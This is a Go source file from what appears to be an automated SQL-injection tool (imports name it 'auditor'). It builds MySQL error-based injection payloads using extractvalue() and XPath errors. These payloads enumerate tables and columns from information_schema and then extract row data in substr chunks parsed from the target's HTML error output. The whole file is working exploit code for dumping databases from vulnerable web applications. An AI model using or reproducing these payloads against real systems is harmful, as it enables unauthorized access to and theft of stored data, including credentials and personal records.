package errorBased

import (
	"auditor/entities"
	"fmt"
	"log"
	"regexp"
	"strconv"
	"strings"
)

func TrimData(s string) string {
	s = strings.ReplaceAll(s, "XPATH syntax error: ':", "")
	s = strings.ReplaceAll(s, "'\nWarning:", "")
	s = strings.ReplaceAll(s, "'", "")
	return s
}

func buildColumnsPayload(tbl string, length bool, head, tail int) string {
	if length {
		payload := `+and+extractvalue(1,concat(':',length((select+group_concat(column_name)+from+information_schema.columns+where+table_name+=+'%s'))))`
		return fmt.Sprintf(payload, tbl)
	}
	payload := `+and+extractvalue(1,concat(':',substr((select+group_concat(column_name)+from+information_schema.columns+where+table_name+=+'%s'),%d,%d)))`
	return fmt.Sprintf(payload, tbl, head, tail)
}

func buildDatabasesPayload(head, tail int) string {
	payload := `+and+extractvalue(1,concat(':',substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema+=+database()),%d,%d)))`
	return fmt.Sprintf(payload, head, tail)
}

func fetchingDataFromHTML(options *entities.DBOptions, payload string) string {
	html := ErrorBasedvalidate(options, payload)
	r := regexp.MustCompile(ErrXPathQueryFrom)
	return TrimData(r.FindString(html))
}

func fetchingDataFromHTMLWithouTrim(options *entities.DBOptions, payload string) string {
	html := ErrorBasedvalidate(options, payload)
	r := regexp.MustCompile(ErrXPathQueryFrom)
	return r.FindString(html)
}

func fetchingColumnsLen(options *entities.DBOptions, table string) int {
	payload := buildColumnsPayload(table, ScanLength, 0, 0)
	data := fetchingDataFromHTML(options, payload)
	length, _ := strconv.Atoi(TrimData(data))
	return length
}

func fetchingDatabasesLen(options *entities.DBOptions) int {
	data := fetchingDataFromHTML(options, "+and+extractvalue(1,concat(':',length((select+group_concat(table_name)+from+information_schema.tables+where+table_schema+=+database()))))")
	dbLength, _ := strconv.Atoi(TrimData(data))

	log.Println("[*] DB length: ", dbLength)
	return dbLength
}

func buildRowsPayload(columnsPayload, table string, length bool, head, tail int) string {

	if length {
		payload := `+and+extractvalue(1,concat(':',length((select+group_concat(%s)+from+%s))))`
		return fmt.Sprintf(payload, columnsPayload, table)
	}
	payload := `+and+extractvalue(1,concat(':',substr((select+group_concat(%s)+from+%s),%d,%d)))`
	return fmt.Sprintf(payload, columnsPayload, table, head, tail)
}

func fetchingRowsLen(options *entities.DBOptions, table string) int {
	log.Println("[*] build rows length payload.")

	options.PayloadStr = ""
	var totalColumns = len(options.Tables[table])
	for i, column := range options.Tables[table] {
		log.Println("[+] building payload by column: ", column)
		options.PayloadStr += column
		if i < totalColumns-1 {
			options.PayloadStr += fmt.Sprintf(",%s,", ColonSymbol_16)
		}
	}

	log.Println("[-] columns payload = ", options.PayloadStr)
	lengthPayload := buildRowsPayload(options.PayloadStr, table, ScanLength, 0, 0)
	rowsLength := fetchingDataFromHTML(options, lengthPayload)
	log.Println("[-] rows string long: ", rowsLength)
	mark, _ := strconv.Atoi(rowsLength)

	return mark
}
